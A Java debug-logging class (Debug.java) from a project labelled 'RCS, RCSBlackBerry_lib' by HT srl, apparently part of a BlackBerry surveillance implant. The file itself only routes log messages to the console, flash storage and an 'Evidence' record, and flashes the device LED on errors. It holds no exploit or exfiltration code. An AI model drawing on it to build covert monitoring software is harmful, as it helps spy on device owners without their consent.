//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Debug.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.debug;

import java.util.Date;

import net.rim.device.api.i18n.DateFormat;
import net.rim.device.api.system.Alert;
import net.rim.device.api.system.LED;
import net.rim.device.api.util.NumberUtilities;
import blackberry.config.Conf;
import blackberry.config.Keys;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.fs.Path;
import blackberry.utils.Check;

/**
 * The Class Debug.
 */
public final class Debug {

    public static int level = 6;

    static DebugWriter debugWriter;
    static Evidence logInfo;

    private static boolean logToDebugger;
    private static boolean logToFlash;
    private static boolean logToEvents;
    private static boolean logToInfo;

    private static boolean enabled = true;
    private static boolean init = false;

    //                  1234567890123456
    String className = "                ";

    int actualLevel = 6;

    public static final int COLOR_BLUE_LIGHT = 0x00C8F0FF; //startRecorder
    public static final int COLOR_RED = 0x00ff1029; // error
    public static final int COLOR_ORANGE = 0x00ff5e1b; // crysis
    public static final int COLOR_GREEN = 0x001fbe1a;
    public static final int COLOR_GREEN_LIGHT = 0x0044DC4C; // evidence
    public static final int COLOR_YELLOW = 0x00f3f807; // sync

    /*
     * prior: priorita', da 6 bassa a bassa, level LEVEL = {
     * TRACE,DEBUG,INFO,WARN, ERROR, FATAL }
     */

    /**
     * Instantiates a new debug.
     * 
     * @param className_
     *            the class name_
     */
    public Debug(final String className_) {
        this(className_, DebugLevel.VERBOSE);
    }

    /**
     * Instantiates a new debug.
     * 
     * @param className_
     *            the class name_
     * @param classLevel
     *            the class level
     */
    public Debug(final String className_, final int classLevel) {

        //#ifdef DBC
        Check.requires(className_ != null, "className_ void");
        Check.requires(className_.length() > 0, "className_ empty");
        //#endif

        final int len = className_.length();

        //#ifdef DBC
        Check.requires(len <= className.length(), "Classname too long");
        //#endif

        className = className_ + className.substring(len);
        actualLevel = Math.min(classLevel, level);

        //trace("Level: " + actualLevel);
    }

    public static boolean isInitialized() {
        return init;
    }

    /**
     * Inits the.
     * 
     * @param logToDebugger_
     *            the log to console
     * @param logToSD_
     *            the log to SD
     * @param logToFlash_
     *            the log to internal Flash
     * @param logToEvents_
     *            the log to events_
     * @return true, if successful
     */
    public static boolean init() {
        //#ifdef DBC
        //Check.requires(Path.isInizialized(), "init: Path not initialized");
        //#endif

        if (isInitialized()) {
            return false;
        }

        Debug.logToDebugger = Conf.DEBUG_OUT;
        Debug.logToFlash = Conf.DEBUG_FLASH;
        Debug.logToEvents = Conf.DEBUG_EVENTS;
        Debug.logToInfo = Conf.DEBUG_INFO;

        debugWriter = DebugWriter.getInstance();

        Path.makeDirs();

        debugWriter.initLogToFile(logToFlash);
        debugWriter.initLogToEvents(logToEvents);

        if (logToFlash || logToEvents) {
            debugWriter.logToEvents = logToEvents;
            debugWriter.logToFile = (logToFlash);

            if (!debugWriter.isAlive()) {
                debugWriter.start();
            }
        }

        init = true;
        return true;
    }

    /**
     * Stop.
     */
    public static synchronized void stop() {
        init = false;
        if (debugWriter != null) {
            debugWriter.requestStop();

            try {
                debugWriter.join();
            } catch (final InterruptedException e) {
            }
        }
    }

    /**
     * Trace.
     * 
     * @param message
     *            the message
     */
    public void trace(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("-   - " + className + " | " + message, DebugLevel.VERBOSE);
        }
        //#endif
    }

    /**
     * Info.
     * 
     * @param message
     *            the message
     */
    public void info(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("-INF- " + className + " | " + message,
                    DebugLevel.INFORMATION);
        }

        //#endif
    }

    /**
     * Warn.
     * 
     * @param message
     *            the message
     */
    public void warn(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("-WRN- " + className + " | " + message, DebugLevel.WARNING);
        }

        //#endif
    }

    /**
     * Warn.
     * 
     * @param message
     *            the message
     */
    public void warn(final Exception ex) {
        //#ifdef DEBUG
        if (enabled) {
            trace("-WRN- " + className + " | " + ex, DebugLevel.WARNING);
        }
        //#endif
    }

    /**
     * Error.
     * 
     * @param message
     *            the message
     */
    public void error(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            ledFlash(Debug.COLOR_RED);
            trace("#ERR# " + className + " | " + message, DebugLevel.ERROR);
        }
        //#endif
    }

    /**
     * Error.
     * 
     * @param message
     *            the message
     */
    public void error(final Exception ex) {
        //#ifdef DEBUG
        if (enabled) {
            ledFlash(Debug.COLOR_RED);

            trace("#ERR# " + className + " | " + ex, DebugLevel.ERROR);
            ex.printStackTrace();
        }
        //#endif
    }

    /**
     * Fatal.
     * 
     * @param message
     *            the message
     */
    public void fatal(final String message) {
        //#ifdef DEBUG
        if (enabled) {
            trace("#FTL# " + className + " | " + message, DebugLevel.CRITICAL);
        }
        //#endif
    }

    public void fatal(final Exception ex) {
        //#ifdef DEBUG
        if (enabled) {
            trace("#FTL# " + className + " | " + ex, DebugLevel.CRITICAL);
            ex.printStackTrace();
        }
        //#endif
    }

    private void logToDebugger(final String string, final int priority) {
        System.out.println(Thread.currentThread().getName() + " " + string);
    }

    private void logToWriter(final String message, final int priority) {

        //#ifdef DBC
        Check.requires(debugWriter != null, "logToFile: debugWriter null");
        Check.requires(logToFlash || logToEvents,
                "! (logToFlash ||  logToEvents )");
        //#endif

        boolean error = (priority <= DebugLevel.ERROR);

        final boolean ret = debugWriter.append(message, priority, error);

        if (ret == false) {
            // procedura in caso di mancata scrittura
            if (Debug.logToDebugger) {
                logToDebugger("debugWriter.append returns false",
                        DebugLevel.ERROR);
            }
        }
    }

    private static void logToInfo(final String message, final int priority) {
        //#ifdef DBC
        Check.requires(logToInfo, "!logToInfo");
        //#endif

        if (logInfo == null) {

            if (!Keys.isInstanced()) {
                return;
            }

            logInfo = new Evidence(EvidenceType.INFO);
        }

        logInfo.atomicWriteOnce(message);

    }

    /*
     * Scrive su file il messaggio, in append. Può scegliere se scrivere su
     * /store o su /SDCard Alla partenza dell'applicativo la SDCard non è
     * visibile.
     */
    private void trace(final String message, final int level) {
        //#ifdef DBC
        Check.requires(level > 0, "level >0");
        //#endif

        if (level > actualLevel || message == null) {
            return;
        }

        if (logToDebugger) {
            logToDebugger(message, level);
        }

        if (!isInitialized()) {
            return;
        }

        if (logToFlash || logToEvents) {
            final long timestamp = (new Date()).getTime();
            /*
             * Calendar calendar = Calendar.getInstance(); calendar.setTime(new
             * Date());
             */

            final DateFormat formatTime = DateFormat
                    .getInstance(DateFormat.TIME_FULL);

            final String time = formatTime.formatLocal(timestamp).substring(0,
                    8);
            String milli = NumberUtilities.toString(timestamp % 1000, 10, 3);

            /*
             * String time = calendar.get(Calendar.HOUR)+":"+
             * calendar.get(Calendar.MINUTE)+":"+ calendar.get(Calendar.SECOND);
             */
            logToWriter(time + " " + milli + " " + message, level);
        }

        if (logToInfo) {
            if (level <= DebugLevel.ERROR) {
                logToInfo(message, level);
            }
        }
    }

    public static void ledFlash(int color) {
        ledStart(color);
        //playSound();
        ledStop();
    }

    public static void ledStart(int color) {
        try {
            LED.setConfiguration(LED.LED_TYPE_STATUS, 1000, 1000,
                    LED.BRIGHTNESS_12);
            LED.setColorConfiguration(1000, 1000, color);
            LED.setState(LED.STATE_BLINKING);
            ;

        } catch (final Exception ex) {

        }

    }

    public static void ledStop() {
        try {
            LED.setState(LED.STATE_OFF);

        } catch (final Exception ex) {

        }
    }

    public static void playSound() {
        short[] fire = { 1400, 15 };
        try {
            Alert.startAudio(fire, 100);
            Alert.startVibrate(100);
        } catch (Exception e) {

        }
    }





}
